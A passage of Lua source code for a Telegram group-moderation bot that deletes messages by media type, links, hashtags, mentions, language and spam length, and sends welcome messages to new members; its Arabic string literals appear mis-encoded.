if Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Escobar     --
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Escobar     --
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Escobar     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Escobar     --
--        Sticker         --
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if Devmfm:get(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_) then
Welcomes = Devmfm:get(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '*ΩΩΩΩΫ Ψ­ΩΨ§ΨͺΫ ΨͺΨΉΩΨ¨ΩΨ³ΩΩΫ ππ·οΈ *\nβ’ [firstname lastname] \nβ’ [@username]'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@TEAM_Escobar]'))
Dev_mfm(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
if Devmfm:get(mustafa.."mfm:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source Escobar     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not Devmfm:get(mustafa..'mfm:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = mustafa,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(mustafa) then 
if Devmfm:sismember(mustafa..'mfm:Groups',msg.chat_id_) then
BotText = "ΩΩΨΉΩΩ ΩΩΩΩ° Ψ§ΩΨ³Ψ§Ψ¨Ω\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΨ§ΩΨ§ΩΨ± ΩΨ§Ψ³ΨͺΩΨͺΨΉ Ψ¨Ψ§ΩΩΩΩΨ²ΩΨ§Ψͺ"
else 
BotText = "ΩΩΨΉΩΨ·ΩΩ ΩΨ¬Ψ¨ Ψ±ΩΨΉΩ ΩΨ΄Ψ±Ω\nβ β« Ψ¨ΨΉΨ― Ψ°ΩΩ ΩΨ±Ψ¬Ω Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ± β ΨͺΩΨΉΩΩ\nβ β« Ψ³ΩΨͺΩ Ψ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ ΩΨ§ΩΩΩΨ΄Ψ¦ ΨͺΩΩΨ§Ψ¦ΩΨ§"
end 
local mfmText = (Devmfm:get(mustafa.."mfm:Text:BotWelcome") or "β β« ΩΨ±Ψ­Ψ¨Ψ§ Ψ§ΩΨ§ Ψ¨ΩΨͺ Ψ§Ψ³ΩΩ "..NameBot.."\nβ β« Ψ­Ψ§ΩΨ© Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β "..BotText.."\nββββ EB ββββ")
local mfmPhoto = (Devmfm:get(mustafa.."mfm:Photo:BotWelcome") or abbas.photos_[0].sizes_[1].photo_.persistent_id_)
if Devmfm:get(mustafa.."mfm:Photo:BotWelcome") or abbas.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,mfmPhoto,mfmText)
else 
send(msg.chat_id_,msg.id_,mfmText)
end 
end   
end
end,nil)
end
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if Devmfm:get(mustafa.."mfm:Lock:Welcome"..msg.chat_id_) then
if Devmfm:get(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_) then
Welcomes = Devmfm:get(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '*β’  ΩΩΩΩΫ Ψ­ΩΨ§ΨͺΫ ΨͺΨΉΩΨ¨ΩΨ³ΩΩΫ ππ·οΈ *\nβ’ [firstname lastname] \nβ’ [@username]'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@TEAM_Escobar]'))
Dev_mfm(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     Source Escobar     --
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Escobar     --
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Escobar     --
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Escobar     --
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Escobar     --
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Escobar     --
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Escobar     --
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not Devmfm:get(mustafa..'mfm:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(Devmfm:get(mustafa..'mfm:Spam:Text'..msg.chat_id_))
end
if Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
--     Source Escobar     --
if Devmfm:get(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "Ψ§ΩΨΊΨ§Ψ‘" then
send(msg.chat_id_,msg.id_,"β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ§Ψ¨Ψ·")       
Devmfm:del(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,Link)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ§Ψ¨Ψ· Ψ¨ΩΨ¬Ψ§Ψ­', 1, 'md')
Devmfm:del(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end
--     Source Escobar     --
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if Devmfm:get('mustafaTEAM:'..mustafa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
Devmfm:del('mustafaTEAM:'..mustafa..'id:user'..msg.chat_id_)  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±', 1, 'md')
Devmfm:del('mustafaTEAM:'..mustafa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
Devmfm:del('mustafaTEAM:'..mustafa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = Devmfm:get('mustafaTEAM:'..mustafa..'id:user'..msg.chat_id_)  
Devmfm:incrby(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
